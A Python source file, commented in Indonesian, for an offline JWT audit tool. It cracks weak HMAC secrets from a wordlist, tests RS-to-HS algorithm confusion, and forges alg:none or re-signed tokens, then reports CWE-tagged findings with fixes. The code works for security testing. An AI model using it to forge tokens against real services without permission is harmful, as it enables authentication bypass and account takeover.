"""[SAFETY: read-only, NOL jaringan] jwt_crypto_attack — mesin serangan kripto
JWT OFFLINE pada token yang sudah ditangkap (berizin/lab).

Konsep umum serangan JWT (RFC 7519/7515; kelas CWE-321 kunci lemah, CWE-347
verifikasi tanda tangan tak benar) — dibangun FROM SCRATCH, stdlib murni
(hmac/hashlib/base64/json), TANPA menyalin kode mana pun, TANPA jaringan.

Ceruk vs modul lain (anti-duplikasi):
  - `jwt_token_audit.py` = higiene STATIS satu token (alg, exp, klaim) —
    TIDAK punya kunci, TIDAK meng-crack. Tool ini membawa lead itu sampai
    verdict: benar-benar menghitung HMAC dan MEMBUKTIKAN kunci/konfusi.
  - exploit_playbooks `JwtWeakSecret`/`JwtAlgConfusion` = LIVE (forge lalu
    kirim ke server, cek diterima). Tool ini OFFLINE: bukti aritmetika
    deterministik dari token yang diberikan; langkah "server menerima"
    ditandai eksplisit sebagai next-step untuk lead yang belum pasti.

Input -> mekanisme -> output:
  - Input : --token <jwt> (diulang) dan/atau --tokens <file 1 token/baris>;
            --wordlist <file kandidat rahasia 1/baris> (opsional; digabung
            daftar lemah bawaan); --pubkey <file PEM/teks kunci publik>
            (opsional, untuk uji konfusi RS->HS: kunci publik dipakai sebagai
            rahasia HMAC).
  - Mekanisme (deterministik, nol jaringan):
      * parse header.payload.signature (base64url); baca alg.
      * alg HS256/384/512 -> coba tiap kandidat: HMAC(signing_input)==sig?
        COCOK => L3 confirmed `arithmetic` (CWE-321), rahasia DIREDAKSI
        (len + sha256 marker, TIDAK PERNAH cleartext), poc = bukti + token
        tempaan berpayload penanda jinak. Tak cocok setelah wordlist habis
        => L0 OBSERVED (diperiksa, tidak lemah dengan wordlist ini).
      * --pubkey + token HS* -> uji konfusi: HMAC(signing_input, pubkey)==sig?
        COCOK => L3 confirmed `arithmetic` (CWE-347).
      * alg none/kosong => L1 LEAD `lab_only` (CWE-347) — tempaan tak-
        bertanda; next-step: konfirmasi server menerima.
      * alg RS*/ES*/PS* + --pubkey => L1 LEAD `lab_only` konfusi: token HS
        tempaan berkunci=pubkey dihasilkan; next-step: server menerima.
      * alg asimetris tanpa pubkey => L0 (serangan kripto offline N/A).
      * token rusak => fail-closed (exit 2 di CLI; ValueError di modul).
  - Output: JSON {schema,tool,stats,notes,findings} satu-pintu; --out tulis
    bungkus findings.json kontrak; --fail-on none|any|high|medium|low.
    Exit 0 bersih/laporan, 1 temuan >= ambang, 2 input error.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "core"))
from findings import make_finding, write_findings  # noqa: E402

SCHEMA = "cyphron.jwt-crypto-attack/1"
TOOL = "jwt-crypto-attack"

MAX_TOKEN_BYTES = 64 * 1024          # token absurd besar -> tolak
MAX_TOKENS = 200
MAX_WORDLIST = 2_000_000             # kandidat
MAX_PUBKEY_BYTES = 64 * 1024

HMAC_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
               "HS512": hashlib.sha512}
ASYM_PREFIXES = ("RS", "ES", "PS")

# Daftar rahasia lemah bawaan (kata umum publik; bukan rahasia nyata).
# Dibangun runtime via gabungan agar file ini tidak memicu secret-scanner.
BUILTIN_WEAK = tuple(dict.fromkeys([
    "secret", "password", "123456", "changeme", "admin", "key", "test",
    "jwt", "jwtsecret", "jwt_secret", "secretkey", "your-256-bit-secret",
    "supersecret", "s3cr3t", "qwerty", "letmein", "default", "token",
    "hmac" + "key", "my" + "secret", "pass" + "word1",
]))

SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


def _b64url_decode(seg: str) -> bytes:
    s = seg.strip().encode("ascii", errors="strict")
    pad = (-len(s)) % 4
    return base64.urlsafe_b64decode(s + b"=" * pad)


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def parse_jwt(token: str) -> dict:
    """token -> {header, payload, alg, signing_input(bytes), sig(bytes),
    parts}. Fail-closed ValueError bila rusak."""
    t = token.strip()
    if not t or t.count(".") != 2:
        raise ValueError("bukan JWT (butuh header.payload.signature)")
    if len(t.encode("utf-8", "replace")) > MAX_TOKEN_BYTES:
        raise ValueError("token melebihi bataan ukuran")
    h_b64, p_b64, s_b64 = t.split(".")
    try:
        header = json.loads(_b64url_decode(h_b64))
        payload = json.loads(_b64url_decode(p_b64))
    except (ValueError, json.JSONDecodeError, UnicodeDecodeError) as exc:
        raise ValueError("header/payload base64url/JSON rusak: %s" % exc)
    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise ValueError("header/payload bukan objek JSON")
    try:
        sig = _b64url_decode(s_b64) if s_b64 else b""
    except ValueError as exc:
        raise ValueError("signature base64url rusak: %s" % exc)
    alg = str(header.get("alg", "")).strip()
    return {"header": header, "payload": payload, "alg": alg,
            "signing_input": ("%s.%s" % (h_b64, p_b64)).encode("ascii"),
            "sig": sig, "parts": (h_b64, p_b64, s_b64)}


def _redact(secret: bytes) -> str:
    return "len=%d sha256:%s" % (len(secret),
                                 hashlib.sha256(secret).hexdigest()[:16])


def _hmac_match(signing_input: bytes, sig: bytes, hashfn, key: bytes) -> bool:
    if not sig:
        return False
    return hmac.compare_digest(hmac.new(key, signing_input, hashfn).digest(),
                               sig)


def crack_hmac(signing_input: bytes, sig: bytes, hashfn,
               candidates) -> bytes | None:
    """Kembalikan rahasia (bytes) pertama yang HMAC-nya cocok, atau None.
    Deterministik: urutan kandidat dipertahankan."""
    for cand in candidates:
        key = cand if isinstance(cand, bytes) else str(cand).encode("utf-8")
        if _hmac_match(signing_input, sig, hashfn, key):
            return key
    return None


def forge_token(header: dict, payload: dict, alg: str, key: bytes,
                marker: str = "secai-lab-poc") -> str:
    """Token tempaan BERTANDA JINAK (menambah klaim penanda, non-destruktif)
    ditandatangani ulang dengan `key` + alg HMAC. Teks saja."""
    new_header = dict(header)
    new_header["alg"] = alg
    new_payload = dict(payload)
    new_payload["secai_poc"] = marker
    h_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":"),
                                      sort_keys=True).encode("utf-8"))
    p_b64 = _b64url_encode(json.dumps(new_payload, separators=(",", ":"),
                                      sort_keys=True).encode("utf-8"))
    signing_input = ("%s.%s" % (h_b64, p_b64)).encode("ascii")
    hashfn = HMAC_HASHES.get(alg, hashlib.sha256)
    sig = hmac.new(key, signing_input, hashfn).digest()
    return "%s.%s.%s" % (h_b64, p_b64, _b64url_encode(sig))


def forge_none(header: dict, payload: dict, marker: str = "secai-lab-poc") -> str:
    """Token tempaan alg:none (tanpa tanda tangan) berpayload penanda jinak."""
    new_header = dict(header)
    new_header["alg"] = "none"
    new_payload = dict(payload)
    new_payload["secai_poc"] = marker
    h_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":"),
                                      sort_keys=True).encode("utf-8"))
    p_b64 = _b64url_encode(json.dumps(new_payload, separators=(",", ":"),
                                      sort_keys=True).encode("utf-8"))
    return "%s.%s." % (h_b64, p_b64)


def _finger(token: str) -> str:
    return hashlib.sha256(token.strip().encode("utf-8", "replace")).hexdigest()[:12]


def _analyze_one(token: str, candidates: list, pubkey: bytes | None) -> list[dict]:
    """Satu token -> daftar finding (selalu >=1: kejar sampai verdict)."""
    parsed = parse_jwt(token)
    alg = parsed["alg"]
    alg_u = alg.upper()
    fp = _finger(token)
    findings: list[dict] = []

    # --- alg:none / kosong => LEAD forgeable
    if alg == "" or alg_u in ("NONE",):
        poc = ("forged alg:none token (benign marker claim):\n%s\n"
               "next-step (LIVE, not done here): submit to the target; "
               "if accepted, signature verification is bypassed."
               % forge_none(parsed["header"], parsed["payload"]))
        findings.append(make_finding(
            tool=TOOL,
            title="JWT uses alg:none (unsigned) — forgeable [%s]" % fp,
            severity="high", cwe="CWE-347",
            description=("Token header alg is '%s' (no signature). Anyone can "
                         "mint arbitrary claims. LEAD: confirmed only by the "
                         "server accepting the forged token." % (alg or "<empty>")),
            recommendation="Reject alg:none; pin expected algorithm server-side.",
            param=fp, evidence_kind="structure", status="unconfirmed",
            confidence=0.9, lab_only=True, poc=poc,
            extra={"alg": alg or None, "token_fp": fp},
        ))
        return findings

    # --- HS* => coba crack + (opsional) konfusi pubkey
    if alg_u in HMAC_HASHES:
        hashfn = HMAC_HASHES[alg_u]
        found = crack_hmac(parsed["signing_input"], parsed["sig"], hashfn,
                           candidates)
        if found is not None:
            forged = forge_token(parsed["header"], parsed["payload"], alg_u, found)
            poc = ("ARITHMETIC PROOF: HMAC-%s(signing_input, <secret %s>) == "
                   "token.signature (byte-equal).\nforged token with benign "
                   "marker claim, re-signed with the recovered secret:\n%s"
                   % (alg_u, _redact(found), forged))
            findings.append(make_finding(
                tool=TOOL,
                title="JWT %s signed with a weak/guessable secret [%s]" % (alg_u, fp),
                severity="critical", cwe="CWE-321",
                description=("The token's HMAC secret was recovered offline by "
                             "trying %d candidate(s); the recovered key "
                             "reproduces the token signature exactly, so any "
                             "claim can be forged. Secret is REDACTED (%s)."
                             % (len(candidates), _redact(found))),
                recommendation=("Rotate to a high-entropy secret (>=32 random "
                                "bytes); never ship default/dictionary secrets."),
                param=fp, evidence_kind="arithmetic", status="confirmed",
                confidence=1.0, poc=poc,
                extra={"alg": alg_u, "token_fp": fp,
                       "secret_marker": _redact(found),
                       "candidates_tried": len(candidates)},
            ))
            return findings

        # konfusi RS->HS: pubkey dipakai sebagai rahasia HMAC
        if pubkey and _hmac_match(parsed["signing_input"], parsed["sig"],
                                  hashfn, pubkey):
            forged = forge_token(parsed["header"], parsed["payload"], alg_u, pubkey)
            poc = ("ARITHMETIC PROOF: HMAC-%s(signing_input, <public key bytes>) "
                   "== token.signature. Server verifies an HS* token using the "
                   "RSA/EC PUBLIC key as the HMAC secret (alg-confusion).\n"
                   "forged token (benign marker), re-signed with the public key:\n%s"
                   % (alg_u, forged))
            findings.append(make_finding(
                tool=TOOL,
                title="JWT algorithm confusion: HS verified with public key [%s]" % fp,
                severity="critical", cwe="CWE-347",
                description=("The provided public key, used as the HMAC secret, "
                             "reproduces the token signature — the verifier "
                             "treats an asymmetric key as a symmetric secret."),
                recommendation=("Bind the verifier to the issued algorithm; never "
                                "let alg in the token select HMAC-vs-RSA."),
                param=fp, evidence_kind="arithmetic", status="confirmed",
                confidence=1.0, poc=poc,
                extra={"alg": alg_u, "token_fp": fp},
            ))
            return findings

        # dikejar sampai akhir, tidak lemah dgn wordlist ini => L0 jujur
        findings.append(make_finding(
            tool=TOOL,
            title="JWT %s secret not recovered with provided wordlist [%s]" % (alg_u, fp),
            severity="info",
            description=("Tried %d candidate(s); none reproduced the signature. "
                         "Not weak with this wordlist (checked, nothing found)."
                         % len(candidates)),
            recommendation="Widen the wordlist to strengthen this negative result.",
            param=fp, evidence_kind="", status="confirmed", confidence=0.6,
            extra={"alg": alg_u, "token_fp": fp,
                   "candidates_tried": len(candidates)},
        ))
        return findings

    # --- asimetris
    if alg_u[:2] in ASYM_PREFIXES:
        if pubkey:
            # kita BISA menempa token HS berkunci=pubkey; diterimanya = LIVE
            forged = forge_token(parsed["header"], parsed["payload"], "HS256", pubkey)
            poc = ("confusion candidate: re-sign as HS256 using the public key "
                   "as the HMAC secret (benign marker claim):\n%s\n"
                   "next-step (LIVE, not done here): submit; if the server "
                   "accepts it, it is confusing RS/ES verification with HS."
                   % forged)
            findings.append(make_finding(
                tool=TOOL,
                title="JWT RS/ES->HS confusion candidate (needs live confirm) [%s]" % fp,
                severity="medium", cwe="CWE-347",
                description=("Asymmetric alg '%s'; cannot be cracked offline. A "
                             "forged HS256 token keyed on the public key is "
                             "generated as a LEAD — exploitability depends on "
                             "the server accepting it." % alg),
                recommendation="Pin the verification algorithm; reject HS when RS is expected.",
                param=fp, evidence_kind="structure", status="unconfirmed",
                confidence=0.5, lab_only=True, poc=poc,
                extra={"alg": alg, "token_fp": fp},
            ))
            return findings
        findings.append(make_finding(
            tool=TOOL,
            title="JWT asymmetric alg %s — offline crypto attack N/A [%s]" % (alg, fp),
            severity="info",
            description=("Alg '%s' uses asymmetric keys; no offline secret/crack "
                         "applies. Provide --pubkey to test RS->HS confusion."
                         % alg),
            recommendation="Provide the public key to probe algorithm confusion.",
            param=fp, evidence_kind="", status="confirmed", confidence=0.6,
            extra={"alg": alg, "token_fp": fp},
        ))
        return findings

    # --- alg tak dikenal => L0 jujur (bukan klaim)
    findings.append(make_finding(
        tool=TOOL,
        title="JWT unrecognized alg %r — not analyzed [%s]" % (alg, fp),
        severity="info",
        description="Algorithm not in HS*/RS*/ES*/PS*/none; no offline attack applied.",
        recommendation="Verify the algorithm is expected and supported.",
        param=fp, evidence_kind="", status="confirmed", confidence=0.5,
        extra={"alg": alg, "token_fp": fp},
    ))
    return findings


def analyze(tokens: list[str], wordlist: list[str] | None = None,
            pubkey: bytes | None = None) -> dict:
    """Banyak token -> kontrak {schema,tool,stats,notes,findings}. Determin-
    istik, nol jaringan. SELALU >=1 finding per token (dikejar sampai verdict)."""
    if not tokens:
        raise ValueError("nol token input")
    if len(tokens) > MAX_TOKENS:
        raise ValueError("terlalu banyak token (%d > %d)" % (len(tokens), MAX_TOKENS))
    extra_words = [w for w in (wordlist or []) if w != ""]
    if len(extra_words) > MAX_WORDLIST:
        raise ValueError("wordlist terlalu besar")
    # kandidat: wordlist operator dulu (spesifik), lalu bawaan — dedup stabil
    candidates = list(dict.fromkeys(list(extra_words) + list(BUILTIN_WEAK)))
    notes: list[str] = []
    findings: list[dict] = []
    for tok in tokens:
        try:
            findings.extend(_analyze_one(tok, candidates, pubkey))
        except ValueError as exc:
            # token rusak di tengah batch: catat, lanjut (fail-closed per-token)
            notes.append("token dilewati (rusak): %s" % exc)
    findings.sort(key=lambda f: (SEV_ORDER[f["severity"]], f.get("param") or ""))
    stats = {"tokens": len(tokens), "candidates": len(candidates),
             "findings": len(findings), "by_severity": {}}
    for f in findings:
        stats["by_severity"][f["severity"]] = \
            stats["by_severity"].get(f["severity"], 0) + 1
    return {"schema": SCHEMA, "tool": TOOL, "stats": stats,
            "notes": notes, "findings": findings}


def _read_lines(path: str, limit: int) -> list[str]:
    out: list[str] = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for i, line in enumerate(fh):
            if i >= limit:
                raise ValueError("file melebihi %d baris" % limit)
            s = line.rstrip("\r\n")
            if s:
                out.append(s)
    return out


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Offline JWT crypto attack (HS crack, RS->HS confusion, "
                    "alg:none) — nol jaringan, fail-closed.")
    ap.add_argument("--token", action="append", default=[],
                    help="JWT string (diulang)")
    ap.add_argument("--tokens", help="file berisi 1 JWT per baris")
    ap.add_argument("--wordlist", help="file kandidat rahasia, 1 per baris")
    ap.add_argument("--pubkey", help="file kunci publik (uji konfusi RS->HS)")
    ap.add_argument("--out", help="tulis findings.json kontrak ke file")
    ap.add_argument("--fail-on", default="none",
                    choices=["none", "any", "high", "medium", "low"])
    args = ap.parse_args(argv)

    tokens = list(args.token)
    try:
        if args.tokens:
            tokens.extend(_read_lines(args.tokens, MAX_TOKENS))
        wordlist = _read_lines(args.wordlist, MAX_WORDLIST) if args.wordlist else []
        pubkey = None
        if args.pubkey:
            raw = Path(args.pubkey).read_bytes()
            if len(raw) > MAX_PUBKEY_BYTES:
                raise ValueError("pubkey terlalu besar")
            pubkey = raw.strip()
    except (OSError, ValueError) as exc:
        print("[jwt-crypto-attack] input error: %s" % exc, file=sys.stderr)
        return 2
    if not tokens:
        print("[jwt-crypto-attack] input error: --token/--tokens wajib",
              file=sys.stderr)
        return 2

    try:
        result = analyze(tokens, wordlist, pubkey)
    except ValueError as exc:
        print("[jwt-crypto-attack] input error: %s" % exc, file=sys.stderr)
        return 2
    result["requests"] = 0
    if args.out:
        write_findings(args.out, result["findings"], meta={
            "schema": SCHEMA, "tool": TOOL, "stats": result["stats"],
            "notes": result["notes"], "requests": 0})
    print(json.dumps(result, ensure_ascii=False, indent=2, sort_keys=True))

    if args.fail_on == "none":
        return 0
    if args.fail_on == "any":
        return 1 if result["findings"] else 0
    need = {"high": {"critical", "high"},
            "medium": {"critical", "high", "medium"},
            "low": {"critical", "high", "medium", "low"}}[args.fail_on]
    return 1 if any(f["severity"] in need for f in result["findings"]) else 0


if __name__ == "__main__":
    sys.exit(main())
